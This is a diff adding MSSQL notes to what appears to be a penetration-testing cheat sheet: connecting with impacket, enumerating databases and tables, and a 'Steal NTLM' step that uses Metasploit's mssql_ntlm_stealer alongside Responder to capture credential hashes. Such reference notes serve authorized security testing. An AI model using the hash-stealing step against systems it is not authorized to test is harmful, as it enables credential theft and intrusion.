@@ -132,6 +132,19 @@ mysql -h <IP> -u <USER> -p --skip-ssl
 mssql
 ```bash
 impacket-mssqlclient <user>@<FQDN/IP> -windows-auth
+
+# View databases
+SELECT name FROM sys.databases
+
+# View tables
+SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;
+
+# Select from tables
+SELECT * FROM dbo.backupset
+
+# Steal NTLM
+msf> use auxiliary/admin/mssql/mssql_ntlm_stealer #Steal NTLM hash, before executing run Responder
+
 ```
 ### SMTP
 ```bash
